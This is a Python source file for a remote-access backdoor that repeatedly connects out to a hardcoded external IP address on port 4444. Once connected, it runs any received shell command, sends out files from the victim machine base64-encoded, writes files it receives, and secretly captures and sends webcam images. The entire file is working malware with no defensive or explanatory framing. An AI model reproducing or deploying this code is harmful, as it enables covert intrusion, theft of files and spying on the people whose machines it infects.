import socket, json, subprocess, os, cv2
import base64, threading, time, webbrowser



def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text


class Backdoor:

	def __init__(self, ip, port):
		self.ip = ip
		self.port = port

		self.connected = False
		self.connection = None

	def connect(self):
		while True:
			if not self.connected:
				print("try connect")
				try:
					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					self.connection.connect((self.ip, self.port))
					self.connected = True
					print("[+] Connected")
				except:
					time.sleep(2)


	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

   
	def reliable_recive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode()
				return json.loads(json_data)
			except: continue


	def write_file(self, path, content):
		content = base64.b64decode(content)
		with open(path, "wb") as file:
			file.write(content)
			print(f"[+] You can see your file as {path}")


	def read_file(self, path):
		file = open(path, "rb").read()
		file = base64.encodebytes(file).decode()
		return file


	def execute_system_command(self, command):
		try:
			res = UkDecode(subprocess.check_output(command, shell = True))
			return res
		except:
			return "[-] Check your command"


	def change_working_directory_to(self, path):
		try:
			os.chdir(path)
			return "[+] Changing working directory to " + path
		except:
			return f"[-] No such file or directory: '{path}'"


	def run(self):
		while True:
			if self.connected:
				command = self.reliable_recive()
				if command == "exit":
					self.reliable_send("")
					self.connected = False

				elif command.split()[0] == "cd":
					path = command.replace("cd", "").strip()
					res = self.change_working_directory_to(path)
					self.reliable_send(res)

				elif command == "camera":
					try:
						cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
						result, image = cam.read()
						cv2.imwrite("camera.jpg", image)
						self.reliable_send(self.read_file("camera.jpg") )
						os.remove("camera.jpg")       
						cam.release()
					except: 
						self.reliable_send("[-] Can't connect to any camera")

				elif command.split()[0] == "download":
					file = command.replace("download", "").strip()
					if os.path.exists(file):
						self.reliable_send(self.read_file(file))
					else: 
						self.reliable_send("[-] Check your command")

				else:
					res = self.execute_system_command(command)
					self.reliable_send(res)



if __name__ == "__main__":
	backdoor = Backdoor("172.105.76.139", 4444)
	# backdoor = Backdoor("192.168.0.108", 4444)

	backdoor_thread = threading.Thread(target=backdoor.connect)
	backdoor_thread.start()

	backdoor.run()
